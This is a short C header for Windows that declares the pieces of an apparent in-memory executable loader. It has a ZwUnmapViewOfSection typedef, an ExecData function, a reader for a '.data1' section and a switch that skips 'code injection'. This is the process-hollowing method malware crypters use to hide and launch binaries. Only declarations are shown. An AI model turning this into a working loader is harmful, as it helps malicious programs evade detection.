
#include <windows.h>

#define SECTION_NAME ".data1"

/* Define DEFER_INJECT to skip code injection. */
//#define DEFER_INJECT

//extern "C" NTSYSAPI LONG NTAPI ZwUnmapViewOfSection(HANDLE, PVOID);
/* http://stackoverflow.com/questions/15714492/creating-a-proccess-in-memory-c */
typedef LONG(NTAPI *pfnZwUnmapViewOfSection)(HANDLE, PVOID);

ULONG protect(ULONG characteristics);

HRESULT
ExecData(PVOID &pvPEData);

int
GetSectionData(
	_TCHAR *moduleName,
	PUINT32 puSectionDataSize,
	PBYTE *pbSectionData
);